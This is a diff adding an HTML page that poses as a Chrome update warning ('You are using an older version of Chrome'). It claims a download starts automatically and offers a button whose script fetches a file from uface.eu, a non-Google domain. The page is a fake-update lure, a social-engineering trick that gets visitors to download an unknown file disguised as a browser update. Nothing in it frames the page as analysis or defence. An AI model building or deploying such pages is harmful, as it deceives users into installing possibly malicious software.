@@ -1,0 +1,53 @@
+<!DOCTYPE>
+<html>
+	<head>
+		<!--<link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet'>-->
+		<link rel="preconnect" href="https://fonts.gstatic.com">
+		<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100&display=swap" rel="stylesheet">
+		<style>
+			h1 {
+	    		font-family: 'Roboto';
+				font-size: 4vw;
+				margin: 0 auto;
+			}
+			h2 {
+                font-family: 'Roboto';
+                font-size: 1.5vw;
+				color: gray;
+ 			}
+			button {
+				background: url('https://i.imgur.com/UVvfDcV.jpg');
+				height: 55px;
+				width: 246px;
+				border: none;
+			}
+			div {
+				padding-left: 13%;
+				padding-bottom: 0%;
+			}
+			body {
+				background-color: white;
+			}
+		</style>
+		<script>
+			function download() {
+				var link = document.createElement('a');
+			    link.href = "https://uface.eu/download";
+			    link.download="";
+			    link.click();
+			}
+		</script>
+	</head>
+	<body>
+		<div>
+			<img height="30%" src="https://img.ltn.com.tw/Upload/3c/page/2019/08/15/190815-37699-1.jpg"/>
+		</div>
+		<center>
+			<h1>You are using an older version of Chrome</h1>
+			<h2>Update now to keep your Chrome browser running smoothly and securely.</h2>
+			<h2>Your download will begin automatically. If not, click here:</h2>
+			<button onclick="download()"></button>
+		</center>
+		
+	</body>
+</html>
